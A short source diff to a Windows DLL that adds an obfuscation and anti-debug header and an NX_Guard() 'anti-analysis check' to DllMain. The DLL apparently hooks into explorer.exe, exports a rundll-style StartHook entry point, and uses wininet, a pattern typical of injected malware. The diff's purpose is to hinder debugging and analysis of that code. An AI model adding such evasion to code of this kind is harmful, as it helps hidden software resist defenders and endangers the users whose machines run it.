@@ -31,6 +31,9 @@
 #define _UNICODE
 #define WIN32_LEAN_AND_MEAN
 
+// NexoraX protection layer (string obfuscation + anti-debug)
+#include "NexoraXProtect.h"
+
 #include <windows.h>
 #include <wininet.h>
 #include <ole2.h>
@@ -2710,6 +2713,7 @@ void CALLBACK StartHook(HWND,HINSTANCE,LPSTR,int){
 BOOL APIENTRY DllMain(HMODULE hMod,DWORD reason,LPVOID){
     if(reason==DLL_PROCESS_ATTACH){
         g_hModule=hMod; DisableThreadLibraryCalls(hMod);
+        NX_Guard(); // Anti-debug / anti-analysis check
         wchar_t proc[MAX_PATH]={}; GetModuleFileNameW(nullptr,proc,MAX_PATH);
         const wchar_t* base=wcsrchr(proc,L'\\'); base=base?base+1:proc;
         if(_wcsicmp(base,L"explorer.exe")==0 && InterlockedCompareExchange(&g_active,1,0)==0){
